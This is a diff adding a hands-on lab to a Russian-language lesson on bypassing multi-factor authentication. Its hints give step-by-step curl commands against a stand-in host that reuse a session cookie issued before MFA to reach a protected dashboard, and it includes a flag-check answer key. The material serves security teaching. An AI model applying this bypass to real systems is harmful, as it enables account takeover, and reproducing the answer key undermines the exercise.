@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 45
 summary: "Как обходить второй фактор: логика многошаговой аутентификации, манипуляция ответами, race, перебор OTP, backup-коды."
+lab:
+  kind: shell
+  title: "Практика: обход MFA"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - Логин: `curl -s -i -X POST 'http://app.example/api/login' -d 'username=admin&password=Spring2024!'`.
+    - Обрати внимание: сервер уже выдал `Set-Cookie: session=...`, хотя MFA не пройден.
+    - Возьми дашборд этой сессией: `curl -s -i 'http://app.example/api/dashboard' -H 'Cookie: session=mfa_pending_9f21'`.
+    - Флаг — последняя строка: `curl -s -i 'http://app.example/api/dashboard' -H 'Cookie: session=mfa_pending_9f21' | tail -1 > found.txt`, затем `check`.
 ---
 
 ## Вопрос, с которого всё начинается
